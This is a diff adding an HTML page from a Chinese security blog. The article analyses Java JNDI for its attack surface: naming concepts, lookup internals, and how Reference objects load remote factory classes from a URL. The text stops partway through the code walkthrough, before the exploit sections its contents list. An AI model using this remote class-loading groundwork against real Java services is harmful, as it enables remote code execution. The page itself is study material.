@@ -1,0 +1,1206 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    JNDI |
+    
+    S@Ku_yA的blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="JNDI概述Java Naming Directory Interface，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。JNDI可访问的现有目录及服务包括：JDBC（Java 数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NIS（网络信息服务）、CORBA（公共对象请">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI">
+<meta property="og:url" content="http://example.com/2026/04/01/JNDI/index.html">
+<meta property="og:site_name" content="S@Ku_yA的blog">
+<meta property="og:description" content="JNDI概述Java Naming Directory Interface，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。JNDI可访问的现有目录及服务包括：JDBC（Java 数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NIS（网络信息服务）、CORBA（公共对象请">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331102746852.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331103011683.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331103232328.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331102746852.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331103921484.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331105927701.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331105941144.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331110338216.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331111652383.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331111734302.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331111841336.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331112109044.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331112425978.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331112219092.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331113713213.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331113724238.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331113755577.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331114008364.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331114059181.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331142359545.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331142447326.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331142515335.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331142700667.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331142848700.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331143051370.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331143236108.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331143304193.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331143417720.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331143635105.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331143711958.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331143817955.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331143902052.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331144015770.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331144051292.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331144111965.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331144211211.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331144545356.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331145247912.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260331145314118.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402113004812.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402112555460.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402113102563.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402113146244.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402113629691.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402113836164.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402113926578.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402114018032.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402114229466.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402114458897.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402114905401.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402115041612.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402115256083.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402115456823.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402115613648.png">
+<meta property="og:image" content="http://example.com/2026/04/01/JNDI/image-20260402115736649.png">
+<meta property="article:published_time" content="2026-04-01T11:46:20.000Z">
+<meta property="article:modified_time" content="2026-04-02T04:51:54.534Z">
+<meta property="article:author" content="S@Ku_yA">
+<meta property="article:tag" content="JNDI">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="攻击面">
+<meta property="article:tag" content="知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/04/01/JNDI/image-20260331102746852.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="S@Ku_yA的blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css" integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr&#x2F;Io" crossorigin="anonymous">
+
+    
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+    
+  </nav>
+  
+</div>
+<header id="header" aria-label="Site header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="JNDI">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <span id="logo">
+            <h1 data-aos="slide-up">JNDI</h1>
+          </span>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI"><span class="toc-number">1.</span> <span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.0.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1-%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.0.2.</span> <span class="toc-text">命名服务&#x2F;目录服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">简单使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83API"><span class="toc-number">1.2.1.</span> <span class="toc-text">核心API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">初始化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.3.</span> <span class="toc-text">查找对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">Reference对象的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-RMI-Reference%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">JNDI_RMI_Reference限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-LDAP-Reference%E9%99%90%E5%88%B6"><span class="toc-number">1.4.</span> <span class="toc-text">JNDI_LDAP_Reference限制</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">34</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-JNDI" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-01T11:46:20.000Z" itemprop="datePublished">2026-04-01</time>
+    <time style="display: none;" id="post-update-time">2026-04-02</time>
+  </span>
+  
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Java%E6%94%BB%E5%87%BB%E9%9D%A2/" title="Java攻击面">Java攻击面</a>
+  </div>
+
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Java Naming Directory Interface，Java命名和目录接口，是SUN公司提供的一种标准的Java命名系统接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。JNDI可访问的现有目录及服务包括：JDBC（Java 数据库连接）、LDAP（轻型目录访问协议）、RMI（远程方法调用）、DNS（域名服务）、NIS（网络信息服务）、CORBA（公共对象请求代理系统结构）</p>
+<h3 id="命名服务-目录服务"><a href="#命名服务-目录服务" class="headerlink" title="命名服务&#x2F;目录服务"></a>命名服务&#x2F;目录服务</h3><p>JNDI包括命名服务（Naming Service）和目录服务（Directory Service）。</p>
+<ul>
+<li><p>命名服务：一种通过名称来查找实际对象的服务。例如RMI中，Naming.lookup方法通过查找名称来获取远程对象的代理类</p>
+<p>相关概念：</p>
+<ul>
+<li>Name：名称。要在命名系统中查找对象，需要提供对象的名称</li>
+<li>Naming Convention：命名规范。一个命名系统中的所有名称必须遵循的语法规范。</li>
+<li>Binding：绑定。一个名称和一个对象的关联</li>
+<li>Reference：<strong>引用</strong>。一些命名服务系统不是直接存储对象，而是保存对象的引用。引用包含了如何访问实际对象的信息。</li>
+<li>Address：地址。引用通常用一个或多个地址（通信端口）来表示</li>
+<li>Context：上下文。一个上下文是一系列名称和对象的绑定的集合。一个上下文中的名称可以绑定到一个具有相同命名规范的上下文中，称之为子上下文(subcontext)。例如：在文件系统中，&#x2F;usr是一个Context，&#x2F;usr&#x2F;bin是usr的subcontext。</li>
+<li>Naming System：命名系统。一个相同类型的上下文集合</li>
+<li>Namespace：命名空间。一个命名系统的所有名称的集合</li>
+<li>Atomic Name：原子名。一个简单基本结构</li>
+<li>Compound Name：混合名。由多个原子名一起构成的名称</li>
+<li>Composite Name：复合名称。是跨越多个命名系统的名称</li>
+</ul>
+</li>
+<li><p>目录服务：是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象，目录对象可以跟属性关联，一个目录是由相关联的目录对象组成的系统。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
+<p>相关概念：</p>
+<ul>
+<li>Attribute：属性。一个目录对象可以包含属性。一个属性具有一个属性标识符和一系列属性值</li>
+<li>Search Filter：查找过滤器。通常还提供通过目录对象的属性来查找对象的操作。这种的查找一般通过规定的表达式来表示，称之为查找过滤器。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.Attributes;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDItest</span>   &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建环境变量</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        <span class="comment">//设置JNDI初始化工厂类名</span></span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        <span class="comment">//设置jndi提供服务的uri</span></span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;dns://223.6.6.6/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//创建jndi目录服务对象</span></span><br><span class="line">            <span class="type">DirContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> context.getAttributes(<span class="string">&quot;www.baidu.com&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/01/JNDI/image-20260331102746852.png" alt="image-20260331102746852"></p>
+<hr>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="核心API"><a href="#核心API" class="headerlink" title="核心API"></a>核心API</h3><p><code>javax.naming.InitialContext</code></p>
+<p><code>javax.naming.directory.InitialDirContext</code></p>
+<p>用于初始化上下文环境</p>
+<p><img src="/2026/04/01/JNDI/image-20260331103011683.png" alt="image-20260331103011683"></p>
+<p>需要传入一个Hashtable</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,<span class="string">&quot;dns://223.6.6.6/&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>环境设置需要<strong>上下文工厂</strong>与<strong>URL</strong></p>
+<p><img src="/2026/04/01/JNDI/image-20260331103232328.png" alt="image-20260331103232328"></p>
+<p>将环境传入InitialDirContext中 完成上下文初始化</p>
+<p>目录服务可以获取到属性名</p>
+<p><img src="/2026/04/01/JNDI/image-20260331102746852.png" alt="image-20260331102746852"></p>
+<p>输出了dns解析结果</p>
+<p><strong>InitialDirContext继承于InitialContex</strong> </p>
+<p>设置环境信息不是必须的 </p>
+<p>也可以直接这样写 会<strong>自动的协议转换</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">init</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">RMIInterface</span> <span class="variable">a</span> <span class="operator">=</span> init.lookup(<span class="string">&quot;rmi://127.0.0.1:1234/demo&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以直接获取到rmi的远程对象</p>
+<p><img src="/2026/04/01/JNDI/image-20260331103921484.png" alt="image-20260331103921484"></p>
+<p>JNDI支持这些协议 主要使用 RMI与LDAP</p>
+<hr>
+<p>JNDI定义了命名引用，简称引用。其大致过程是通过绑定一个引用，将引用对象存储到命名&#x2F;目录服务中，命名管理器（Naming Manager）可以将引用解析为关联的原始对象。</p>
+<p>引用由Reference类来表示，每个Reference包含如何构造对应的对象的信息，包括<strong>引用对象的全限定类名，服务地址，以及用于创建对象的工厂类的名称和位置</strong></p>
+<p><img src="/2026/04/01/JNDI/image-20260331105927701.png" alt="image-20260331105927701"></p>
+<p>主要利用这个构造器</p>
+<p><img src="/2026/04/01/JNDI/image-20260331105941144.png" alt="image-20260331105941144"></p>
+<p>className:类名 如果本地找不到会去根据factoryLocation提供的<strong>URL去下载对应的.class文件</strong> 并<strong>自动加载</strong></p>
+<p>factory:工厂类的名字 一般我们提供的类已经引用了这个工厂类 </p>
+<p>factoryLocation:工厂类的URL 可以是file:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;、http:&#x2F;&#x2F;等协议</p>
+<hr>
+<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>跟进一手这个无参初始化</p>
+<p><img src="/2026/04/01/JNDI/image-20260331110338216.png" alt="image-20260331110338216"></p>
+<p><img src="/2026/04/01/JNDI/image-20260331111652383.png" alt="image-20260331111652383"></p>
+<p>进入到init </p>
+<p><img src="/2026/04/01/JNDI/image-20260331111734302.png" alt="image-20260331111734302"></p>
+<p>进入到getInitialEnvironment</p>
+<p><img src="/2026/04/01/JNDI/image-20260331111841336.png" alt="image-20260331111841336"></p>
+<p><img src="/2026/04/01/JNDI/image-20260331112109044.png" alt="image-20260331112109044"></p>
+<p>函数内部就是获取环境变量信息 但是因为我们没有填入所以都是null</p>
+<p><img src="/2026/04/01/JNDI/image-20260331112425978.png" alt="image-20260331112425978"></p>
+<p><img src="/2026/04/01/JNDI/image-20260331112219092.png" alt="image-20260331112219092"></p>
+<p>最终就返回了initialContext对象 无参构造器主要通过后面的lookup去动态配置环境信息</p>
+<h3 id="查找对象"><a href="#查找对象" class="headerlink" title="查找对象"></a>查找对象</h3><p>重点关注这个lookup</p>
+<p><img src="/2026/04/01/JNDI/image-20260331113713213.png" alt="image-20260331113713213"></p>
+<p><img src="/2026/04/01/JNDI/image-20260331113724238.png" alt="image-20260331113724238"></p>
+<p>进入getURLOrDefaultInitCtx</p>
+<p><img src="/2026/04/01/JNDI/image-20260331113755577.png" alt="image-20260331113755577"></p>
+<p>进入到hasInitialContextFactoryBuilder</p>
+<p><img src="/2026/04/01/JNDI/image-20260331114008364.png" alt="image-20260331114008364"></p>
+<p>由于没有初始化上下文工厂所以为null</p>
+<p>最后返回的是False</p>
+<p>跳过了第一个if判断</p>
+<p><img src="/2026/04/01/JNDI/image-20260331114059181.png" alt="image-20260331114059181"></p>
+<p>进入getURLScheme函数</p>
+<p><img src="/2026/04/01/JNDI/image-20260331142359545.png" alt="image-20260331142359545"></p>
+<p><img src="/2026/04/01/JNDI/image-20260331142447326.png" alt="image-20260331142447326"></p>
+<p>返回协议类型</p>
+<p>进入到NamingManager.getURLContext</p>
+<p><img src="/2026/04/01/JNDI/image-20260331142515335.png" alt="image-20260331142515335"></p>
+<p>根据刚刚的协议返回rmiurlcontext</p>
+<p><img src="/2026/04/01/JNDI/image-20260331142700667.png" alt="image-20260331142700667"></p>
+<p>回到lookup 进入getRootURLContext</p>
+<p><img src="/2026/04/01/JNDI/image-20260331142848700.png" alt="image-20260331142848700"></p>
+<p>进入到RegistryContext</p>
+<p><img src="/2026/04/01/JNDI/image-20260331143051370.png" alt="image-20260331143051370"></p>
